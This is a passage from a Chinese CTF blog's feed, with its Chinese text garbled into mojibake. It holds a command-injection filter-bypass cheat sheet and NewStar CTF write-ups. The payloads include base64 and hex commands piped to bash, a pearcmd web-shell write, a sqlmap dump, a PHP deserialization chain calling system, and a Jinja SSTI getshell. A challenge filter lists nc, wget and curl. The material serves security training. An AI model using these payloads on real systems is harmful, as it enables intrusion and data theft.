â€”â€”è¿™é‡ŒæŠŠï¼Œæ›¿æ¢æˆäº†ç©ºæ ¼é”®</span><br><span class="line"></span><br><span class="line">%<span class="number">20</span>                                 â€”â€”ä»£è¡¨spaceé”®</span><br><span class="line"></span><br><span class="line">%<span class="number">09</span>      <span class="literal">--</span>  éœ€è¦phpç¯å¢ƒï¼Œå¦‚<span class="built_in">cat</span>%<span class="number">09</span>flag.php</span><br><span class="line"></span><br><span class="line"><span class="variable">$</span>&#123;IFS&#125;<span class="literal">--</span>  å•çº¯<span class="built_in">cat</span><span class="variable">$IFS2</span>,IFS2è¢«bashè§£é‡Šå™¨å½“åšå˜é‡åï¼Œè¾“ä¸å‡ºæ¥ç»“æœï¼ŒåŠ ä¸€ä¸ª&#123;&#125;å°±å›ºå®šäº†å˜é‡åï¼Œå¦‚<span class="built_in">cat</span><span class="variable">$</span>&#123;IFS2&#125;flag.php</span><br><span class="line"></span><br><span class="line"><span class="variable">$IFS</span><span class="variable">$9</span><span class="literal">--</span>  åé¢åŠ ä¸ª<span class="variable">$</span>ä¸&#123;&#125;ç±»ä¼¼ï¼Œèµ·æˆªæ–­ä½œç”¨ï¼Œ<span class="variable">$9</span>æ˜¯å½“å‰ç³»ç»Ÿshellè¿›ç¨‹ç¬¬ä¹ä¸ªå‚æ•°æŒæœ‰è€…ï¼Œå§‹ç»ˆä¸ºç©ºå­—ç¬¦ä¸²ï¼Œå¦‚<span class="built_in">cat</span><span class="variable">$IFS2</span><span class="variable">$9flag</span>.php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;  <span class="literal">--</span>  é‡å®šå‘ï¼Œå¦‚<span class="built_in">cat</span>&lt;flag.php</span><br><span class="line"></span><br><span class="line">&lt;&gt;      <span class="literal">--</span>   é‡å®šå‘ï¼Œå¦‚<span class="built_in">cat</span>&lt;&gt;flag.php</span><br></pre></td></tr></table></figure><h4 id="6-2å­—ç¬¦ä¸²æ‹¼æ¥">6.2å­—ç¬¦ä¸²æ‹¼æ¥</h4><p>å‰æï¼šèƒ½å¤Ÿæ‰§è¡Œç³»ç»Ÿå‘½ä»¤</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET:</span><br><span class="line">?<span class="attribute">a</span>=content1;b=content2;cat <span class="variable">$b</span></span><br><span class="line">POSTï¼š</span><br><span class="line"><span class="attribute">chu0</span>=a=l;b=s;c=/;$a$b <span class="variable">$c</span></span><br></pre></td></tr></table></figure><h4 id="6-3base64ç¼–ç ç»•è¿‡">6.3base64ç¼–ç ç»•è¿‡</h4><p>å‰æï¼šèƒ½å¤Ÿæ‰§è¡Œç³»ç»Ÿå‘½ä»¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> MTIzCg==|<span class="built_in">base64</span> -d å…¶å°†ä¼šæ‰“å°123</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> bHMgLw== | <span class="built_in">base64</span> -d | bash </span><br><span class="line">`<span class="built_in">echo</span> bHMgLw== | <span class="built_in">base64</span> -d`                   ==&gt;<span class="built_in">ls</span> /</span><br><span class="line"><span class="built_in">echo</span> bHMgLw== | <span class="built_in">base64</span> -d | sh</span><br></pre></td></tr></table></figure><h4 id="6-4hexç¼–ç ç»•è¿‡">6.4hexç¼–ç ç»•è¿‡</h4><p>ç”Ÿæˆè„šæœ¬</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;ls /&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">bin2hex</span>(<span class="variable">$a</span>);  <span class="comment">//6c73202f</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo <span class="number">6</span>c73202f | <span class="type">xxd</span> -r -p | <span class="type">bash</span></span><br><span class="line">`echo <span class="number">6</span>c73 | <span class="type">xxd</span> -r -p`</span><br><span class="line">echo `<span class="number">6</span>c73202f` | <span class="type">xxd</span> -r -p | <span class="type">sh</span> &gt; <span class="number">1.</span>txt</span><br></pre></td></tr></table></figure><h4 id="6-5å•å¼•å·å’ŒåŒå¼•å·ç»•è¿‡">6.5å•å¼•å·å’ŒåŒå¼•å·ç»•è¿‡</h4><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ca<span class="string">&#x27;&#x27;</span>t <span class="built_in">flag</span> </span><br><span class="line">ca<span class="string">&quot;&quot;</span>t <span class="built_in">flag</span></span><br><span class="line">l<span class="string">&#x27;&#x27;</span>s /</span><br><span class="line">l<span class="string">&quot;&quot;</span>s /</span><br></pre></td></tr></table></figure><h4 id="6-6åæ–œæ ç»•è¿‡">6.6åæ–œæ ç»•è¿‡</h4><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">l<span class="string">\s</span> /</span><br><span class="line">l<span class="string">\s</span> /<span class="keyword">var</span>/www/ht<span class="string">\ml</span></span><br><span class="line">ca<span class="string">\t</span> f<span class="string">\ag</span></span><br></pre></td></tr></table></figure><h4 id="6-7ç»•è¿‡ipä¸­çš„å¥ç‚¹">6.7ç»•è¿‡ipä¸­çš„å¥ç‚¹</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ç½‘ç»œåœ°å€å¯ä»¥è½¬æ¢æˆæ•°å­—åœ°å€ï¼Œæ¯”å¦‚<span class="number">127.0</span>.<span class="number">0.1</span>å¯ä»¥è½¬åŒ–ä¸º<span class="number">2130706433</span>ã€‚</span><br><span class="line">å¯ä»¥ç›´æ¥è®¿é—®http:<span class="regexp">//</span><span class="number">2130706433</span>æˆ–è€…http:<span class="regexp">//</span><span class="number">0</span>x7F000001ï¼Œè¿™æ ·å°±å¯ä»¥ç»•è¿‡.çš„ipè¿‡æ»¤ã€‚</span><br></pre></td></tr></table></figure><p><a href="http://www.msxindl.com/tools/ip/ip_num.asp">æ•°å­—è½¬ipåœ°å€</a> <a href="http://www.msxindl.com/tools/ip/ip_num.asp">ipåœ°å€è½¬æ•°å­—</a> <a href="http://www.msxindl.com/tools/ip/ip_num.asp">åŸŸåè½¬æ•°å­—ip</a></p><h4 id="6-8teeã€scriptå‘½ä»¤">6.8teeã€scriptå‘½ä»¤</h4><p><strong>ctfshow web136</strong></p><p><strong>æºç </strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$x</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="variable">$x</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">check</span>(<span class="variable">$c</span>);</span><br><span class="line">    <span class="title function_ invoke__">exec</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p><strong>å‘½ä»¤è¯´æ˜</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tee file1 file2 <span class="regexp">//</span>å¤åˆ¶æ–‡ä»¶</span><br><span class="line">ls|tee <span class="number">1</span>.txt <span class="regexp">//</span>å‘½ä»¤è¾“å‡º</span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="built_in">cat</span> /f149_15_h3r3|<span class="built_in">tee</span> 1</span><br><span class="line">?c=<span class="built_in">cat</span> /f149_15_h3r3|script 1</span><br></pre></td></tr></table></figure><h4 id="6-9call-user-function">6.9call_user_function()</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phpæ–‡æ¡£è§£æï¼šhttps:<span class="regexp">//</span>www.php.net<span class="regexp">/manual/</span>zh/<span class="keyword">function</span>.call-user-<span class="keyword">func</span>.php</span><br></pre></td></tr></table></figure><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">æ–¹å¼ä¸€ï¼š</span><br><span class="line">call<span class="constructor">_user_func(<span class="params">ctfshow</span>::<span class="params">getflag</span>)</span>;  <span class="comment">//å¼•ç”¨é™æ€å‚æ•°</span></span><br><span class="line"></span><br><span class="line">æ–¹å¼äºŒï¼š</span><br><span class="line">call_user_funcå‡½æ•°é‡Œé¢å¯ä»¥ä¼ æ•°ç»„ï¼Œç¬¬ä¸€ä¸ªå…ƒç´ æ˜¯ç±»åæˆ–è€…ç±»çš„ä¸€ä¸ªå¯¹è±¡ï¼Œç¬¬äºŒä¸ªå…ƒç´ æ˜¯ç±»çš„æ–¹æ³•åï¼ŒåŒæ ·å¯ä»¥è°ƒç”¨</span><br><span class="line">call<span class="constructor">_user_func(<span class="params">array</span>($<span class="params">classname</span>, &#x27;<span class="params">say_hello</span>&#x27;)</span>);</span><br><span class="line">è°ƒç”¨classnameè¿™ä¸ªç±»é‡Œçš„sya_helloæ–¹æ³•</span><br></pre></td></tr></table></figure><h4 id="6-10ä¸‰ç›®è¿ç®—ç¬¦">6.10ä¸‰ç›®è¿ç®—ç¬¦</h4><p><strong>æ³¨æ„ï¼Œåœ¨æ„é€ ä¸‰ç›®è¿ç®—ç¬¦çš„æ—¶å€™ï¼Œè¦æŠŠ?å’Œ:æ”¾åœ¨åŒä¸€ä¸ªå˜é‡å½“ä¸­</strong></p><p><strong>ctfshow web145</strong></p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;return 1?phpinfo():1;&quot;</span>);</span><br><span class="line"></span><br><span class="line">v1=<span class="number">1</span>&amp;v3=?(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%99%D5):&amp;v2=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span> ?(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%99%D5): <span class="number">1</span>  <span class="comment">//æ ¼å¼æ˜¯è¿™ä¸ªæ ·å­çš„</span></span><br></pre></td></tr></table></figure><h4 id="6-11ç­‰å·å’Œä½è¿ç®—">6.11ç­‰å·å’Œä½è¿ç®—</h4><p><strong>ctfshow web146</strong></p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;return 1==phpinfo()||1;&quot;</span>);</span><br><span class="line"></span><br><span class="line">(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%99%D5)</span><br></pre></td></tr></table></figure><h4 id="6-12æ­£åˆ™åŒ¹é…">6.12æ­£åˆ™åŒ¹é…</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ä¾‹å¦‚ï¼š</span><br><span class="line"><span class="built_in">ls</span> flag  =&gt;   <span class="built_in">ls</span> [e-g]lag</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">æ•´ç†çš„ç¬”è®°</summary>
    
    
    
    <category term="CTF" scheme="https://bowuchuling.github.io/categories/CTF/"/>
    
    <category term="ç¬”è®°" scheme="https://bowuchuling.github.io/categories/CTF/%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="CTF" scheme="https://bowuchuling.github.io/tags/CTF/"/>
    
    <category term="ç¬”è®°" scheme="https://bowuchuling.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>NewStar CTF WEEK 3</title>
    <link href="https://bowuchuling.github.io/posts/fcr7dhw7.html"/>
    <id>https://bowuchuling.github.io/posts/fcr7dhw7.html</id>
    <published>2023-10-17T02:57:26.640Z</published>
    <updated>2023-10-17T03:01:02.405Z</updated>
    
    <content type="html"><![CDATA[<h1>NewStar CTF WEEK3</h1><h2 id="Include-ğŸ">Include ğŸ</h2><p>pearcmdæ–‡ä»¶åŒ…å«ï¼Œç”¨bpå‘åŒ…é˜²æ­¢payloadè¢«ç¼–ç </p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?+config-create+<span class="regexp">/&amp;file=/</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../u</span>sr<span class="regexp">/local/</span>lib<span class="regexp">/php/</span>pearcmd&amp;<span class="regexp">/&lt;?=eval($_POST[1]);?&gt;+/</span>tmp/chuling2.php</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆexp</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GETï¼š</span><br><span class="line">?<span class="attribute">file</span>=/tmp/chuling2</span><br><span class="line">POST:</span><br><span class="line"><span class="attribute">1</span>=phpinfo();</span><br></pre></td></tr></table></figure><p>åé¢å°±æ˜¯å‘½ä»¤æ‰§è¡Œäº†</p><h2 id="medium-sql">medium_sql</h2><p>sqlmapä¸€æŠŠæ¢­ï¼Œæ—¶é—´ç›²æ³¨</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u url/?<span class="built_in">id</span>= -p <span class="built_in">id</span> -D ctf -T here_is_flag -C flag <span class="comment">--dump --batch</span></span><br></pre></td></tr></table></figure><h2 id="POP-Gadget">POP Gadget</h2><p>ç®€å•çš„popé“¾</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE_<span class="number">_</span>);</span><br><span class="line"></span><br><span class="line">class Begin&#123;</span><br><span class="line">    public <span class="variable">$name</span>;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[a-zA-Z0-9]/&quot;</span>,<span class="variable">$this-</span><span class="built_in">&gt;name</span>))&#123;</span><br><span class="line">            echo <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            echo <span class="string">&quot;Welcome to NewStarCTF 2023!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Then&#123;</span><br><span class="line">    public <span class="variable">$func</span>;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        (<span class="variable">$this-</span>&gt;func)();  //<span class="variable">$this-</span>&gt;func=new ç±»å();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Good Job!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Handle&#123;</span><br><span class="line">    public <span class="variable">$obj</span>;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> __call(<span class="variable">$func</span>, <span class="variable">$vars</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        echo <span class="string">&quot;call&quot;</span>;</span><br><span class="line">        <span class="variable">$this-</span>&gt;obj-&gt;<span class="keyword">end</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Super&#123;</span><br><span class="line">    public <span class="variable">$obj</span>;</span><br><span class="line">    public <span class="keyword">function</span> __invoke()  //  å­—æ¯æ•°å­—()</span><br><span class="line">    &#123;</span><br><span class="line">        echo <span class="string">&quot;invoke&quot;</span>;</span><br><span class="line">        <span class="variable">$this-</span>&gt;obj-&gt;getStr();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> <span class="keyword">end</span>()</span><br><span class="line">    &#123;</span><br><span class="line">        die(<span class="string">&quot;==GAME OVER==&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class CTF&#123;</span><br><span class="line">    public <span class="variable">$handle</span>;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> <span class="keyword">end</span>()</span><br><span class="line">    &#123;</span><br><span class="line">        echo <span class="string">&quot;end&quot;</span>;</span><br><span class="line">        unset(<span class="variable">$this-</span>&gt;handle-&gt;log);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class WhiteGod&#123;</span><br><span class="line">    public <span class="variable">$func</span>;</span><br><span class="line">    public <span class="variable">$var</span>;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> __unset(<span class="variable">$var</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        (<span class="variable">$this-</span>&gt;func)(<span class="variable">$this-</span>&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = new Begin();</span><br><span class="line"><span class="variable">$a-</span><span class="built_in">&gt;name</span> = new Then();</span><br><span class="line"><span class="variable">$a-</span><span class="built_in">&gt;name</span>-&gt;func = new Super();</span><br><span class="line"><span class="variable">$a-</span><span class="built_in">&gt;name</span>-&gt;func-&gt;obj = new Handle();</span><br><span class="line"><span class="variable">$a-</span><span class="built_in">&gt;name</span>-&gt;func-&gt;obj-&gt;obj = new CTF();</span><br><span class="line"><span class="variable">$a-</span><span class="built_in">&gt;name</span>-&gt;func-&gt;obj-&gt;obj-&gt;handle = new WhiteGod();</span><br><span class="line"><span class="variable">$a-</span><span class="built_in">&gt;name</span>-&gt;func-&gt;obj-&gt;obj-&gt;handle-&gt;func=<span class="string">&#x27;system&#x27;</span>;</span><br><span class="line"><span class="variable">$a-</span><span class="built_in">&gt;name</span>-&gt;func-&gt;obj-&gt;obj-&gt;handle-&gt;var=<span class="string">&#x27;cat /flag&#x27;</span>;</span><br><span class="line">echo urlencode(serialize(<span class="variable">$a</span>));</span><br><span class="line">//O<span class="meta">%3A5</span><span class="meta">%3A</span><span class="meta">%22Begin</span><span class="meta">%22</span><span class="meta">%3A1</span><span class="meta">%3A</span><span class="meta">%7Bs</span><span class="meta">%3A4</span><span class="meta">%3A</span><span class="meta">%22name</span><span class="meta">%22</span><span class="meta">%3BO</span><span class="meta">%3A4</span><span class="meta">%3A</span><span class="meta">%22Then</span><span class="meta">%22</span><span class="meta">%3A1</span><span class="meta">%3A</span><span class="meta">%7Bs</span><span class="meta">%3A4</span><span class="meta">%3A</span><span class="meta">%22func</span><span class="meta">%22</span><span class="meta">%3BO</span><span class="meta">%3A5</span><span class="meta">%3A</span><span class="meta">%22Super</span><span class="meta">%22</span><span class="meta">%3A1</span><span class="meta">%3A</span><span class="meta">%7Bs</span><span class="meta">%3A3</span><span class="meta">%3A</span><span class="meta">%22obj</span><span class="meta">%22</span><span class="meta">%3BO</span><span class="meta">%3A6</span><span class="meta">%3A</span><span class="meta">%22Handle</span><span class="meta">%22</span><span class="meta">%3A1</span><span class="meta">%3A</span><span class="meta">%7Bs</span><span class="meta">%3A3</span><span class="meta">%3A</span><span class="meta">%22obj</span><span class="meta">%22</span><span class="meta">%3BO</span><span class="meta">%3A3</span><span class="meta">%3A</span><span class="meta">%22CTF</span><span class="meta">%22</span><span class="meta">%3A1</span><span class="meta">%3A</span><span class="meta">%7Bs</span><span class="meta">%3A6</span><span class="meta">%3A</span><span class="meta">%22handle</span><span class="meta">%22</span><span class="meta">%3BO</span><span class="meta">%3A8</span><span class="meta">%3A</span><span class="meta">%22WhiteGod</span><span class="meta">%22</span><span class="meta">%3A2</span><span class="meta">%3A</span><span class="meta">%7Bs</span><span class="meta">%3A4</span><span class="meta">%3A</span><span class="meta">%22func</span><span class="meta">%22</span><span class="meta">%3Bs</span><span class="meta">%3A6</span><span class="meta">%3A</span><span class="meta">%22system</span><span class="meta">%22</span><span class="meta">%3Bs</span><span class="meta">%3A3</span><span class="meta">%3A</span><span class="meta">%22var</span><span class="meta">%22</span><span class="meta">%3Bs</span><span class="meta">%3A4</span><span class="meta">%3A</span><span class="meta">%22ls</span>+<span class="meta">%2F</span><span class="meta">%22</span><span class="meta">%3B</span><span class="meta">%7D</span><span class="meta">%7D</span><span class="meta">%7D</span><span class="meta">%7D</span><span class="meta">%7D</span><span class="meta">%7D</span></span><br></pre></td></tr></table></figure><h2 id="GenShin">GenShin</h2><p>è¿‡æ»¤äº†åŒ{ï¼Œä½¿ç”¨{å’Œ%ç»•è¿‡ï¼Œè¿™é‡Œæ˜¯ç›´æ¥ç”¨äº†ä¹‹å‰æŸæ¬¡sstiçš„expç›´æ¥getshelläº†</p><figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%print(<span class="name">config</span>|attr(<span class="string">&quot;_&quot;</span><span class="string">&quot;_cla&quot;</span><span class="string">&quot;ss_&quot;</span><span class="string">&quot;_&quot;</span>)|attr(<span class="string">&quot;_&quot;</span><span class="string">&quot;_in&quot;</span><span class="string">&quot;it_&quot;</span><span class="string">&quot;_&quot;</span>)|attr(<span class="string">&quot;_&quot;</span><span class="string">&quot;_glo&quot;</span><span class="string">&quot;bals_&quot;</span><span class="string">&quot;_&quot;</span>)|attr(<span class="string">&quot;_&quot;</span><span class="string">&quot;_get&quot;</span><span class="string">&quot;item_&quot;</span><span class="string">&quot;_&quot;</span>)(<span class="string">&quot;o&quot;</span><span class="string">&quot;s&quot;</span>)|attr(<span class="string">&quot;po&quot;</span><span class="string">&quot;pen&quot;</span>)(<span class="string">&quot;ls&quot;</span>)|attr(<span class="string">&quot;re&quot;</span><span class="string">&quot;ad&quot;</span>)())%&#125;</span><br></pre></td></tr></table></figure><h2 id="R-C-E">R!!!C!!!E!!!</h2><p>åº”è¯¥å¯ä»¥ç›²æ³¨ï¼Œè¿™é‡Œä½¿ç”¨</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">minipop</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>=<span class="string">&quot;cat /flag_is_h3eeere|script result1&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$qwejaskdjnlka</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">minipop</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;qwejaskdjnlka = <span class="keyword">new</span> <span class="title function_ invoke__">minipop</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="OtenkiGirl">OtenkiGirl</h2><p>çŒœä¸ªåŸå‹é“¾æ±¡æŸ“ï¼Œå­¦ing</p>]]></content>
    
    
    <summary type="html">æ–°æ‰‹èµ›ï¼Œæ„Ÿè°¢ä¸»åŠæ–¹</summary>
    
    
    
    <category term="CTF" scheme="https://bowuchuling.github.io/categories/CTF/"/>
    
    <category term="æ¯”èµ›WP" scheme="https://bowuchuling.github.io/categories/CTF/%E6%AF%94%E8%B5%9BWP/"/>
    
    
    <category term="CTF" scheme="https://bowuchuling.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="https://bowuchuling.github.io/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>SHCTF WEB WP</title>
    <link href="https://bowuchuling.github.io/posts/54fkfh75.html"/>
    <id>https://bowuchuling.github.io/posts/54fkfh75.html</id>
    <published>2023-10-15T09:13:18.233Z</published>
    <updated>2023-10-17T02:25:11.611Z</updated>
    
    <content type="html"><![CDATA[<h1>SHCTF WEEK2</h1><h2 id="WEEK2-serialize">[WEEK2]serialize</h2><p>æºç å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span 